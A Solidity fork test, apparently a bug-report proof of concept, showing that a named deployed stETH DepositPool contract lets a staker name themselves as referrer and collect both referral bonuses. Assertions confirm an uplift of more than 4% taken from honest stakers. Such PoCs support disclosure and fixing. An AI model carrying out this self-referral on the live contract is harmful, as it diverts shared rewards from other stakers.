// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Harness, IERC20} from "./Harness.sol";

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address user_, uint256 pool_) external view returns (
        uint128 lastStake,
        uint256 deposited,
        uint256 rate,
        uint256 pendingRewards,
        uint128 claimLockStart,
        uint128 claimLockEnd,
        uint256 virtualDeposited,
        uint128 lastClaim,
        address referrer
    );
    function referrersData(address referrer_, uint256 pool_) external view returns (
        uint256 amountStaked,
        uint256 virtualAmountStaked,
        uint256 rate,
        uint256 pendingRewards,
        uint128 lastClaim
    );
    function getCurrentUserMultiplier(uint256 pool_, address user_) external view returns (uint256);
    function getLatestUserReward(uint256 pool_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 pool_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256 pool_) external view returns (uint128);
    function getDistributedRewards(uint256 pool_, address depositPool_) external view returns (uint256);
}

/// @title DepositPool (Ethereum) — self-referral reward uplift PoC
/// @notice Fork test against the DEPLOYED stETH DepositPool proxy
///         0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790 at Ethereum block 26,404,985.
///         stake() accepts ANY referrer address, including the staker himself:
///         the staker instantly gets the +1% referral multiplier on his own virtual
///         deposit AND a referrer-tier reward stream on his own stake (live tiers:
///         >=2.5 stETH referred -> 5% virtual weight). Both streams are paid out of
///         the shared pool rate, diluting stakers who do not self-refer.
///         All actors are fresh unprivileged accounts funded through Lido submit.
contract SelfReferralTest is Harness {
    address internal constant DEPOSIT_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address internal constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    uint256 internal constant ETH_FORK_BLOCK = 26404985;
    uint256 internal constant POOL = 0;
    uint256 internal constant AMOUNT = 10 ether; // 10 stETH

    IDepositPool internal dp = IDepositPool(DEPOSIT_POOL);
    IERC20 internal steth = IERC20(STETH);

    function _fundSteth(address who_) internal {
        vm.deal(who_, 20 ether);
        vm.deal(address(this), 100 ether);
        vm.prank(who_);
        steth.submit{value: AMOUNT}(address(0));
        vm.prank(who_);
        steth.approve(DISTRIBUTOR, type(uint256).max);
    }

    function test_selfReferralUplift() public {
        vm.createSelectFork("eth", ETH_FORK_BLOCK);

        address control = vm.addr(0xC047);
        address attacker = vm.addr(0xA77AC);
        address referred = vm.addr(0xBEEF);

        _fundSteth(control);
        _fundSteth(attacker);
        _fundSteth(referred);

        // Control: no referrer.
        vm.prank(control);
        dp.stake(POOL, AMOUNT, 0, address(0));

        // Third party WITH an external referrer (the bonus baseline).
        vm.prank(referred);
        dp.stake(POOL, AMOUNT, 0, vm.addr(0xF31E));

        // Attacker: self-referral (referrer == staker).
        vm.prank(attacker);
        dp.stake(POOL, AMOUNT, 0, attacker);

        {
            uint256 multControl = dp.getCurrentUserMultiplier(POOL, control);
            uint256 multReferred = dp.getCurrentUserMultiplier(POOL, referred);
            uint256 multAttacker = dp.getCurrentUserMultiplier(POOL, attacker);

            // The self-referrer receives the SAME user-side referral bonus as a genuinely
            // referred staker (the +1% REFERRAL_MULTIPLIER) — with no third party involved.
            assertGt(multReferred, multControl, "referred staker gets a bonus over control");
            assertEq(multAttacker, multReferred, "self-referral bonus == genuine referral bonus");

            // ...and additionally the referrer-tier stream on his OWN stake.
            (uint256 amountStaked, uint256 virtualAmountStaked, , , ) = dp.referrersData(attacker, POOL);
            // (1-wei tolerance: stETH share rounding on transfer, documented Lido behavior.)
            assertGe(amountStaked, AMOUNT - 10, "own stake credited to own referrer record");
            assertGt(virtualAmountStaked, 0, "own referrer record carries virtual weight");
        }

        // Distribution step. Two fork-environment obstacles, both unrelated to the
        // referral accounting under test:
        // (1) A plain vm.warp cannot open the Distributor's 1-day distribution gate:
        //     on a fork the ChainLink feeds are frozen at the pinned block while
        //     their allowed staleness is 1 hour, so any multi-day warp makes
        //     updateDepositTokensPrices read a "stale" feed (in production the
        //     feeds keep updating). Rewinding the Distributor's last-calculated
        //     timestamp (storage slot 205, probed against the live value) is the
        //     scoped equivalent of the same elapsed time.
        // (2) The reward split is pro-rata by *yield*; the stETH pool's yield is
        //     Lido rebasing, which lands once a day via the Lido oracle and may
        //     not have landed inside the pinned window. A 0.5 stETH donation to
        //     the Distributor stands in for the accrued rebase yield (the
        //     contract measures yield purely as balance growth).
        bytes32 lastCalcLoc = keccak256(abi.encode(POOL, uint256(205)));
        uint256 lastCalc = uint256(vm.load(DISTRIBUTOR, lastCalcLoc));
        vm.store(DISTRIBUTOR, lastCalcLoc, bytes32(lastCalc - 2 days));
        IDistributor(DISTRIBUTOR).distributeRewards(POOL);

        address donor = vm.addr(0xD0A7);
        _fundSteth(donor);
        vm.prank(donor);
        steth.transfer(DISTRIBUTOR, 0.5 ether);

        uint256 creditedBefore = IDistributor(DISTRIBUTOR).getDistributedRewards(POOL, DEPOSIT_POOL);
        lastCalc = uint256(vm.load(DISTRIBUTOR, lastCalcLoc));
        vm.store(DISTRIBUTOR, lastCalcLoc, bytes32(lastCalc - 2 days));
        IDistributor(DISTRIBUTOR).distributeRewards(POOL);
        uint256 creditedAfter = IDistributor(DISTRIBUTOR).getDistributedRewards(POOL, DEPOSIT_POOL);
        assertGt(creditedAfter, creditedBefore, "stETH pool credited with MOR rewards");

        uint256 rewardControl = dp.getLatestUserReward(POOL, control);
        uint256 rewardAttacker = dp.getLatestUserReward(POOL, attacker);
        uint256 referrerRewardAttacker = dp.getLatestReferrerReward(POOL, attacker);
        assertGt(rewardControl, 0, "control earns rewards");
        assertGt(rewardAttacker, rewardControl, "attacker user rewards exceed control");
        assertGt(referrerRewardAttacker, 0, "attacker ALSO earns referrer rewards on own stake");

        // Total uplift of the self-referrer over an identical honest stake: > 4%
        // (live config expectation ~6%: +1% user multiplier and +5% referrer virtual
        // weight at the >=2.5 stETH tier, both drawn from the same shared pool rate).
        uint256 totalAttacker = rewardAttacker + referrerRewardAttacker;
        assertGt(totalAttacker * 100, rewardControl * 104, "total self-referral uplift > 4%");
    }
}
